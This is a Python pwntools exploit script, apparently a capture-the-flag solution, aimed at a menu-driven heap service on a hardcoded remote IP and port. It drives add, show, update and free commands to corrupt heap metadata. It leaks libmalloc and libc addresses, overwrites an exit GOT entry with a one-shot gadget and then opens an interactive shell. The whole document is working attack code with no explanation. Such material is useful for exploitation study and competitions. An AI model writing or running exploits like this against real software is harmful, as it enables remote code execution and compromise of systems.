#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

#host = "10.211.55.25"
#port = 8888

host = "111.186.63.147"
port = 6666
context.arch = "amd64"    
r = remote(host,port)


def add(style,shape,size,name):
    r.recvuntil("Choice:")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(style))
    r.recvuntil(":")
    r.sendline(str(shape))
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(name)

def show(idx):
    r.recvuntil("Choice:")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))


def update(idx,style,shape,size,name):
    r.recvuntil("Choice:")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.sendline(str(style))
    r.recvuntil(":")
    r.sendline(str(shape))
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(name)

def free(idx):
    r.recvuntil("Choice:")
    r.sendline("4")
    r.recvuntil(":")
    r.sendline(str(idx))


# need to brute force 4 bit
add(1,2,0x40,"da")
add(1,2,0x40,"da")
update(0,2,3,0x50,"a"*0x40 + p64(0x3fc0/8) )
show(1)
r.recvuntil("Style: ")
libmalloc = u64(r.recvuntil("\n")[:-1].ljust(8,"\x00")) - 0x13d68
print hex(libmalloc)
libc = libmalloc - 0x161000
print hex(libc)
free(1)
free(0)
add(1,2,0x40,"da")
add(1,2,0x40,"da")
update(0,2,3,0x50,"a"*0x40 + p64(0x3fc0/8) )
update(0,2,3,0x50,"a"*0x40 + p64(0x1fffffffffffffef) )
show(1)
r.recvuntil("Style: ")
libcdata = u64(r.recvuntil("\n")[:-1].ljust(8,"\x00")) - 0x4110
print hex(libcdata)
free(1)
free(0)
add(1,2,0x28,"da")
add(1,3,0x100,"a")
add(1,3,0x100,"a")
free(2)
free(1)
add(1,2,0x28,"dada")
___exit_got = libcdata + 0xb0
magic = libc+0x25D94

update(1,1,2,0x40,"a"*0x28 + p64(2) + p64(magic) + p64(___exit_got>>4)[:7])
r.recvuntil("Choice:")
r.sendline("1")
r.recvuntil(":")
r.sendline("2")
r.recvuntil(":")
r.sendline("3")
r.recvuntil(":")
r.sendline("9999")

r.interactive()
